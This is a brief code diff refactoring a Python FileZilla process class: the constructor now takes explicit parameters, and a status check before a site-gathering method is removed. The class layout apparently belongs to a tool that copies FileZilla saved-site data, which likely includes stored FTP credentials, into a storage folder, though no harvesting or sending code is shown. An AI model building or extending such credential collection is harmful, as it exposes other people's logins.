@@ -8,13 +8,13 @@ from ..utils.config import FileZillaConfig
 
 class FileZilla(Process):
 
-    def __init__(self, *args):
+    def __init__(self, storage_path: str, folder: str, errors: bool):
         Process.__init__(self)
 
         self.config = FileZillaConfig()
-
-        for index, variable in enumerate(self.config.Variables):
-            self.__dict__.update({variable: args[index]})
+        self.storage_path = storage_path
+        self.folder = folder
+        self.errors = errors
 
     def __create_folder(self):
 
@@ -64,8 +64,7 @@ class FileZilla(Process):
 
         try:
 
-            if self.statuses[0] is True:
-                self.__get_sites()
+            self.__get_sites()
 
         except Exception as e:
             if self.errors is True: print(f"[FilleZilla]: {repr(e)}")
